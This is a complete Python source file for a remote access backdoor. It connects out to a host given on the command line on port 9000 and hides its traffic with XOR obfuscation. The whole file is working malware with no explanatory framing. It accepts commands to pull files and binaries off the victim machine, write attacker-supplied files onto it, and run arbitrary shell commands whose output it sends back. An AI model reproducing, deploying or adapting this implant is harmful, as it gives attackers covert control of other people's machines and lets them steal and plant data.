#!/usr/bin/python

from socket import socket, SOCK_STREAM, AF_INET
from subprocess import Popen, PIPE
from sys import exit as sysexit, argv
from time import sleep
from multiprocessing import Process, freeze_support

VERSION = "v0.0.6-min"

def getLen(string, maxLen):
    tmp_str = str(len(string))
    lenToReturn = tmp_str
    for i in range(maxLen - len(tmp_str)):
        lenToReturn = '0' + lenToReturn
    return lenToReturn

def make_en_STDOUT(STDOUT,sock):
	en_STDOUT = bytearray(STDOUT,'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	try:
		sock.send(en_STDOUT)
	except:
		sock.close()
		return 1
	return 0

def make_en_bin_STDOUT(STDOUT,sock):
	en_STDOUT = bytearray(STDOUT)
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	try:
		sock.send(en_STDOUT)
	except:
		sock.close()
		return 1
	return 0

def make_en_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data.decode('UTF-8')

def make_en_bin_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data

def get_en_data(sock, size):
	data = sock.recv(size)
	return make_en_data(data)

def get_en_bin_data(sock, size):
	data = sock.recv(size)
	return make_en_bin_data(data)

comm_dict = {
	'00000' : 'killMe',
	'00001' : 'getFile',
	'00002' : 'getBinary',
	'00003' : 'sendFile',
	'00004' : 'sendBinary',
	'00007' : 'command',
	'00008' : 'KILL'
}

def main():
	try:
		RHOST = argv[1]
		RPORT = 9000
	except:
		print ("Must provide hotst")
		sysexit()
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((RHOST,RPORT))
	en_STDOUT = make_en_STDOUT(VERSION,s)
	if en_STDOUT == 1:
		sysexit()

	while True:
		en_data = get_en_data(s,5)
		try:
			en_data = comm_dict[en_data]
		except:
			continue
		if en_data == 'killMe':
			break
		elif en_data == 'getFile':
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				fileToWrite = open(en_data,'w')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fSize = get_en_data(s,13) #File size up to 9999999999999 chars
			en_data = get_en_data(s,int(fSize))
			fileToWrite.write(en_data)
			fileToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "getBinary":
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				binToWrite = open(en_data,'wb')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			bSize = get_en_data(s,13) #Binary size up to 9999999999999 symbols
			en_data = get_en_bin_data(s, int(bSize))
			binToWrite.write(en_data)
			binToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendFile":
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				fileToSend = open(en_data,'r')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fileCont = fileToSend.read()
			fileToSend.close()
			STDOUT = getLen(fileCont,13)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			STDOUT = fileCont
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendBinary":
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				binToSend = open(en_data,'rb')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			binCont = binToSend.read()
			binToSend.close()
			STDOUT = getLen(binCont,13)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			STDOUT = binCont
			en_STDOUT = make_en_bin_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "command":
			en_data = get_en_data(s, 13)
			en_data = get_en_data(s,int(en_data))
			comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
			STDOUT,STDERR = comm.communicate()
			if STDERR:
				decode = STDERR.decode('UTF-8')
			elif STDOUT:
				decode = STDOUT.decode('UTF-8')
			else:
				decode = 'Command has no output'
			lenDecode = getLen(decode,13)
			en_STDOUT = make_en_STDOUT(lenDecode,s)
			if en_STDOUT == 1:
				sysexit()
			en_STDOUT = make_en_STDOUT(decode,s)
			if en_STDOUT == 1:
				sysexit()
	s.close()

#Start Here!
if __name__ == '__main__':
	freeze_support()
	Process(target=main).start()
